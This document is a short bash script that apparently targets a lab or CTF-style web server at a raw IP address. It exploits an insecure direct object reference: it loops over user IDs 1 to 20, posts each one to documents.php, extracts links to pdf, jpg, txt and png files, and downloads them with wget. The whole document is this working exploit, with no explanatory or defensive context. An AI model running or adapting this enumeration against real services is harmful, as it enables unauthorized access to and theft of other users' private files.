#!/bin/bash

base_url="http://94.237.59.63:58389"
file_extensions="pdf|jpg|txt|png" # Add or remove file extensions as needed

# Function to fetch and download files for a given user ID
fetch_and_download_files() {
    local user_id="$1"
    local response
    local page_url="$base_url/documents.php"

    # Fetch the page content for the current user
    response=$(curl -X POST -s -d "uid=${user_id}" "$page_url")
    
    if [ $? -ne 0 ]; then
        echo "Error fetching URL for user ID ${user_id}: $page_url"
        return
    fi
    
    # Extract links with desired file extensions
    echo "$response" | grep -oP "/documents/[^\"' \r\n]*?\.(pdf|jpg|txt|png)" | while read -r link; do
        # Construct the full URL
        full_url="${base_url}${link}"
        
        # Log the URL being downloaded for debugging
        echo "Downloading: $full_url"
        
        # Download the file
        wget -q "$full_url"
        
        if [ $? -ne 0 ]; then
            echo "Error downloading $full_url"
        fi
    done
}

# Iterate over user IDs from 1 to 20
for user_id in {1..20}; do
    echo "Processing user ID $user_id"
    fetch_and_download_files "$user_id"
done

